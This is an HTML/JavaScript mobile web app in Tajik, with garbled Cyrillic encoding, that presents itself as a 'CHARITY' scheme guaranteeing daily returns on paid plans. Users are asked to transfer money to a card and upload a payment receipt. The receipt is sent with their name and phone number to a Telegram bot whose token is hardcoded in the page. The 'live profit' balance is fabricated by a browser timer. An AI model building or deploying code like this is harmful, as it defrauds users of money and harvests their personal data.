<!DOCTYPE html>
<html lang="tg">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CHARITY | Helping Hands</title>
    <style>
        :root { --gold: #ffcc00; --dark: #070b14; --card: #151c2c; --green: #00ff88; --text-gray: #94a3b8; }
        body { margin: 0; padding: 0; font-family: 'Segoe UI', Roboto, sans-serif; background: var(--dark); color: white; overflow-x: hidden; }
        
        .page { display: none; padding: 20px; padding-bottom: 100px; animation: slideUp 0.3s ease-out; }
        .active-page { display: block; }
        @keyframes slideUp { from { transform: translateY(20px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }

        /* –î–∏–∑–∞–π–Ω–∏ –∫–æ—Ä—Ç“≥–æ */
        .glass-card { background: var(--card); border-radius: 20px; padding: 20px; border: 1px solid #2d3748; margin-bottom: 20px; box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.5); }
        .btn-main { background: linear-gradient(45deg, var(--gold), #ffaa00); color: black; padding: 15px; border: none; border-radius: 12px; font-weight: bold; cursor: pointer; width: 100%; font-size: 16px; transition: 0.2s; }
        .btn-main:active { transform: scale(0.98); }

        /* VIP Buttons Style */
        .vip-item { display: flex; justify-content: space-between; align-items: center; background: #1e293b; padding: 20px; border-radius: 15px; margin-bottom: 15px; border-left: 4px solid var(--gold); cursor: pointer; }
        .vip-item h3 { margin: 0; color: var(--gold); }
        
        /* Navigation */
        .nav { position: fixed; bottom: 0; width: 100%; background: rgba(15, 23, 42, 0.95); backdrop-filter: blur(10px); display: flex; justify-content: space-around; padding: 12px 0; border-top: 1px solid #1e293b; z-index: 1000; }
        .nav-item { color: var(--text-gray); text-align: center; font-size: 10px; cursor: pointer; flex: 1; }
        .nav-item i { font-size: 20px; display: block; margin-bottom: 4px; }
        .active-nav { color: var(--gold); font-weight: bold; }

        input { width: 100%; padding: 14px; margin: 10px 0; border-radius: 10px; border: 1px solid #2d3748; background: #0f172a; color: white; box-sizing: border-box; }
        .badge { background: var(--gold); color: black; padding: 2px 8px; border-radius: 5px; font-size: 12px; font-weight: bold; }
    </style>
</head>
<body>

<div id="page-reg" class="page">
    <div style="text-align: center; margin-top: 60px;">
        <img src="https://i.ibb.co/LzNfS6P/charity-logo.png" style="width: 120px; border-radius: 50%; box-shadow: 0 0 20px var(--gold);">
        <h1 style="color: var(--gold); letter-spacing: 2px; margin-top: 20px;">CHARITY</h1>
        <p style="color: var(--text-gray);">–ë–∞—Ä–æ–∏ –≤–æ—Ä–∏–¥ —à—É–¥–∞–Ω –º–∞—ä–ª—É–º–æ—Ç—Ä–æ –ø—É—Ä –∫—É–Ω–µ–¥</p>
        <div class="glass-card">
            <input type="text" id="reg-name" placeholder="–ù–æ–º–∏ —à—É–º–æ">
            <input type="tel" id="reg-phone" placeholder="–†–∞“õ–∞–º–∏ —Ç–µ–ª–µ—Ñ–æ–Ω (9XXXXXXXX)">
            <button class="btn-main" onclick="register()">–í–û–†–ò–î –®–£–î–ê–ù</button>
        </div>
    </div>
</div>

<div id="page-home" class="page">
    <div class="glass-card" style="border-color: var(--gold);">
        <h2 style="margin-top:0">–≠—ä—Ç–∏–º–æ–¥ –≤–∞ –ö–∞—Ñ–æ–ª–∞—Ç ü§ù</h2>
        <p style="line-height: 1.6; color: #cbd5e1;">–ú–æ –±–∞ —à—É–º–æ –∫–∞—Ñ–æ–ª–∞—Ç–∏ <b>1-—Å–æ–ª–∞–∏</b> —Ñ–∞—ä–æ–ª–∏—è—Ç–∏ –±–æ—ç—ä—Ç–∏–º–æ–¥—Ä–æ –º–µ–¥–∏“≥–µ–º. –ú–∞–±–ª–∞“ì“≥–æ–∏ —Ö–∞–π—Ä–∏—è–≤–∏–∏ —à—É–º–æ —Ç–∞“≥—Ç–∏ –Ω–∞–∑–æ—Ä–∞—Ç–∏ “õ–∞—Ç—ä”£ “õ–∞—Ä–æ—Ä –¥–æ—Ä–∞–Ω–¥ –≤–∞ —Ñ–æ–∏–¥–∞–∏ —à—É–º–æ “≥–∞—Ä —Å–æ–Ω–∏—è –∏–ª–æ–≤–∞ –º–µ—à–∞–≤–∞–¥.</p>
        <div style="display: flex; gap: 10px; margin-top: 15px;">
            <div style="flex:1; background: #064e3b; padding: 10px; border-radius: 10px; text-align: center;">
                <span style="display:block; font-size: 12px;">–£—Å—Ç—É–≤–æ—Ä”£</span>
                <b style="color: var(--green);">100%</b>
            </div>
            <div style="flex:1; background: #1e3a8a; padding: 10px; border-radius: 10px; text-align: center;">
                <span style="display:block; font-size: 12px;">–î–∞—Å—Ç–≥–∏—Ä”£</span>
                <b>24/7</b>
            </div>
        </div>
    </div>

    <div class="glass-card" style="text-align: center;">
        <span style="color: var(--text-gray); font-size: 14px;">–§–æ–∏–¥–∞–∏ “∑–æ—Ä–∏–∏ —à—É–º–æ (LIVE):</span>
        <h1 id="live-profit" style="font-size: 42px; margin: 10px 0; color: var(--green);">0.0000</h1>
        <div id="active-status" style="color: var(--gold); font-size: 13px; font-weight: bold;">–ù–∞“õ—à–∞–∏ —Ñ–∞—ä–æ–ª –Ω–µ—Å—Ç</div>
    </div>

    <div class="glass-card">
        <h3>–ü—É—Ä –∫–∞—Ä–¥–∞–Ω–∏ –ë–∞–ª–∞–Ω—Å</h3>
        <p style="font-size: 13px; color: var(--text-gray);">–ú–∞–±–ª–∞“ì—Ä–æ –±–∞ –∫–æ—Ä—Ç–∏ –∑–µ—Ä–∏–Ω –≥—É–∑–∞—Ä–æ–Ω–µ–¥ –≤–∞ —á–µ–∫—Ä–æ —Ñ–∏—Ä–∏—Å—Ç–µ–¥:</p>
        <div style="background: #000; padding: 15px; border-radius: 12px; text-align: center; font-size: 18px; border: 1px dashed var(--gold); letter-spacing: 1px;">4444 5555 6666 7777</div>
        <p style="font-size: 12px; margin-top: 15px;">–ò–Ω—Ç–∏—Ö–æ–±–∏ —á–µ–∫ (—Å—É—Ä–∞—Ç):</p>
        <input type="file" id="check-file" accept="image/*" style="padding: 10px;">
        <button class="btn-main" onclick="sendToTelegram()">–§–ò–†–ò–°–¢–û–î–ê–ù –ë–ê –ê–î–ú–ò–ù</button>
    </div>
</div>

<div id="page-products" class="page">
    <h2 style="color: var(--gold);">–¢—É–≥–º–∞“≥–æ–∏ –î–∞—Ä–æ–º–∞–¥</h2>
    <div id="vip-list"></div>
</div>

<div id="page-details" class="page">
    <button onclick="showPage('products')" style="background:none; border:none; color:var(--gold); font-size:16px; margin-bottom:20px;">‚Üê –ë–æ–∑–≥–∞—à—Ç</button>
    <div id="details-content"></div>
</div>

<div id="page-profile" class="page">
    <div class="glass-card" style="text-align: center;">
        <div id="user-avatar" style="width: 80px; height: 80px; background: var(--gold); color: black; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 30px; font-weight: bold; margin: 0 auto 15px;">U</div>
        <h2 id="profile-name" style="margin:0">–ö–æ—Ä–±–∞—Ä</h2>
        <p id="profile-phone" style="color: var(--text-gray); margin: 5px 0 20px;">900 00 00 00</p>
        <button class="btn-main" style="background: #24292f; color: white;" onclick="window.location.href='https://t.me/charity_tj'">üí¨ –ì–£–†”Æ“≤–ò –¢–ï–õ–ï–ì–†–ê–ú</button>
        <br><br>
        <button onclick="logout()" style="color: #ef4444; background: none; border: none; cursor: pointer;">–•–£–†–£“∂ –ê–ó –ê–ö–ö–ê–£–ù–¢</button>
    </div>
</div>

<nav id="nav-bar" class="nav" style="display:none;">
    <div class="nav-item active-nav" onclick="tabClick(this, 'home')">üè†<br>–ê—Å–æ—Å”£</div>
    <div class="nav-item" onclick="tabClick(this, 'products')">üîò<br>–¢—É–≥–º–∞“≥–æ</div>
    <div class="nav-item" onclick="tabClick(this, 'profile')">üë§<br>–ü—Ä–æ—Ñ–∏–ª</div>
</nav>

<script>
    const BOT_TOKEN = "8693263483:AAH1pHi68Akw2rnGMvEvc4_sMlW070PJc1Q";
    const CHAT_ID = "6365005853";

    const vips = [
        { id: 1, name: '–¢—É–≥–º–∞–∏ 1', price: 120, day: 3, desc: '–ò–Ω –Ω–∞“õ—à–∞ –±–∞—Ä–æ–∏ –Ω–∞–≤–∫–æ—Ä–æ–Ω –±–µ“≥—Ç–∞—Ä–∏–Ω –∞—Å—Ç. –ë–æ –º–∞–±–ª–∞“ì–∏ –∫–∞–º –¥–∞—Ä–æ–º–∞–¥–∏ –¥–æ–∏–º–∏—Ä–æ –æ“ì–æ–∑ –∫—É–Ω–µ–¥.' },
        { id: 2, name: '–¢—É–≥–º–∞–∏ 2', price: 260, day: 6, desc: '–ù–∞“õ—à–∞–∏ –º–∏—ë–Ω–∞ –±–æ —Ñ–æ–∏–¥–∞–∏ –¥—É—á–∞–Ω–¥. –°—É—Ä—ä–∞—Ç–∏ –∞—Ñ–∑–æ–∏—à–∏ –º–∞–±–ª–∞“ì —Ç–µ–∑—Ç–∞—Ä –∞—Å—Ç.' },
        { id: 3, name: '–¢—É–≥–º–∞–∏ 3', price: 470, day: 15, desc: '–ù–∞“õ—à–∞–∏ –∫–∞—Å–±”£ –±–∞—Ä–æ–∏ –æ–Ω“≥–æ–µ, –∫–∏ –º–µ—Ö–æ“≥–∞–Ω–¥ —Ñ–æ–∏–¥–∞–∏ –∫–∞–ª–æ–Ω –±–∞ –¥–∞—Å—Ç –æ—Ä–∞–Ω–¥.' }
    ];

    let user = JSON.parse(localStorage.getItem('charity_user'));
    let activePlan = JSON.parse(localStorage.getItem('charity_plan'));
    let liveVal = parseFloat(localStorage.getItem('charity_balance')) || 0;

    window.onload = () => {
        if(user) {
            startApp();
        } else {
            showPage('reg');
        }
    };

    function register() {
        const name = document.getElementById('reg-name').value;
        const phone = document.getElementById('reg-phone').value;
        if(name.length > 2 && phone.length > 5) {
            user = { name, phone };
            localStorage.setItem('charity_user', JSON.stringify(user));
            startApp();
        } else { alert("–ú–∞—ä–ª—É–º–æ—Ç—Ä–æ –¥—É—Ä—É—Å—Ç –ø—É—Ä –∫—É–Ω–µ–¥!"); }
    }

    function startApp() {
        document.getElementById('page-reg').style.display = 'none';
        document.getElementById('nav-bar').style.display = 'flex';
        document.getElementById('profile-name').innerText = user.name;
        document.getElementById('profile-phone').innerText = user.phone;
        document.getElementById('user-avatar').innerText = user.name[0].toUpperCase();
        showPage('home');
        renderVIPs();
        
        setInterval(() => {
            if(activePlan) {
                liveVal += (activePlan.day / 86400);
                document.getElementById('live-profit').innerText = liveVal.toFixed(4);
                localStorage.setItem('charity_balance', liveVal);
            }
        }, 1000);
    }

    function renderVIPs() {
        const list = document.getElementById('vip-list');
        list.innerHTML = '';
        vips.forEach(v => {
            list.innerHTML += `
                <div class="vip-item" onclick="showDetails(${v.id})">
                    <div>
                        <h3>${v.name}</h3>
                        <span style="color:var(--text-gray)">–ù–∞—Ä—Ö: ${v.price} TJS</span>
                    </div>
                    <span class="badge">–î–ò–î–ê–ù</span>
                </div>`;
        });
    }

    function showDetails(id) {
        const v = vips.find(x => x.id === id);
        const content = document.getElementById('details-content');
        content.innerHTML = `
            <div class="glass-card" style="border-top: 5px solid var(--gold);">
                <h1 style="color:var(--gold)">${v.name}</h1>
                <p style="color:var(--text-gray); line-height:1.5">${v.desc}</p>
                <hr style="border:0; border-top:1px solid #2d3748; margin:20px 0;">
                <div style="display:grid; grid-template-columns: 1fr 1fr; gap:15px; margin-bottom:20px;">
                    <div>üìÖ “≤–∞—Ä —Ä”Ø–∑:<br><b style="color:var(--green)">${v.day} TJS</b></div>
                    <div>üìä 10 —Ä”Ø–∑:<br><b style="color:var(--green)">${v.day * 10} TJS</b></div>
                    <div>üí∞ –Ø–∫ –º–æ“≥:<br><b style="color:var(--green)">${v.day * 30} TJS</b></div>
                    <div>üè¶ –ù–∞—Ä—Ö:<br><b>${v.price} TJS</b></div>
                </div>
                <button class="btn-main" onclick="activatePlan(${v.id})">–ò–ù–¢–ò–•–û–ë –í–ê –§–ê–™–û–õ –ö–ê–†–î–ê–ù</button>
            </div>
        `;
        showPage('details');
    }

    function activatePlan(id) {
        const v = vips.find(x => x.id === id);
        activePlan = v;
        localStorage.setItem('charity_plan', JSON.stringify(v));
        document.getElementById('active-status').innerText = "–§–∞—ä–æ–ª: " + v.name;
        showPage('home');
        alert("–ù–∞“õ—à–∞–∏ " + v.name + " –∏–Ω—Ç–∏—Ö–æ–± —à—É–¥. –õ—É—Ç—Ñ–∞–Ω —á–µ–∫–∏ –ø–∞—Ä–¥–æ—Ö—Ç—Ä–æ —Ñ–∏—Ä–∏—Å—Ç–µ–¥.");
    }

    async function sendToTelegram() {
        const fileInput = document.getElementById('check-file');
        if (!fileInput.files[0]) return alert("–õ—É—Ç—Ñ–∞–Ω –∞–≤–≤–∞–ª —Å—É—Ä–∞—Ç–∏ —á–µ–∫—Ä–æ –±–æ—Ä –∫—É–Ω–µ–¥!");

        const btn = document.querySelector('button[onclick="sendToTelegram()"]');
        btn.innerText = "–§–ò–†–ò–°–¢–û–î–ê –ò–°–¢–û–î–ê–ê–°–¢...";
        btn.disabled = true;

        const formData = new FormData();
        formData.append("chat_id", CHAT_ID);
        formData.append("photo", fileInput.files[0]);
        formData.append("caption", `üì• –ß–ï–ö–ò –ù–ê–í!\nüë§ –ù–æ–º: ${user.name}\nüìû –¢–µ–ª: ${user.phone}\nüí≥ –ù–∞“õ—à–∞: ${activePlan ? activePlan.name : '–ò–Ω—Ç–∏—Ö–æ–± –Ω–∞—à—É–¥–∞'}`);

        try {
            const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: formData });
            if(res.ok) {
                alert("‚úÖ –ß–µ–∫–∏ —à—É–º–æ —Ñ–∏—Ä–∏—Å—Ç–æ–¥–∞ —à—É–¥! –ê–¥–º–∏–Ω –ø–∞—Å –∞–∑ —Ç–∞—Ñ—Ç–∏—à –±–∞–ª–∞–Ω—Å–∏ —à—É–º–æ—Ä–æ —Ç–∞—Å–¥–∏“õ –º–µ–∫—É–Ω–∞–¥.");
                btn.innerText = "–§–ò–†–ò–°–¢–û–î–ê –®–£–î ‚úÖ";
            } else { alert("–•–∞—Ç–æ–≥”£ –¥–∞—Ä –±–æ—Ç! –ë–æ—Ç—Ä–æ –¥–∞—Ä –¢–µ–ª–µ–≥—Ä–∞–º START –∫–∞—Ä–¥–µ–¥?"); btn.disabled = false; }
        } catch (e) { alert("–•–∞—Ç–æ–≥–∏–∏ —à–∞–±–∞–∫–∞!"); btn.disabled = false; }
    }

    function showPage(p) {
        document.querySelectorAll('.page').forEach(pg => pg.classList.remove('active-page'));
        document.getElementById('page-'+p).classList.add('active-page');
        window.scrollTo(0,0);
    }

    function tabClick(el, p) {
        document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active-nav'));
        el.classList.add('active-nav');
        showPage(p);
    }

    function logout() {
        if(confirm("–û—ë –º–µ—Ö–æ“≥–µ–¥ –∞–∑ –∞–∫–∫–∞—É–Ω—Ç –±–∞—Ä–æ–µ–¥?")) {
            localStorage.clear();
            location.reload();
        }
    }
</script>
</body>
</html>
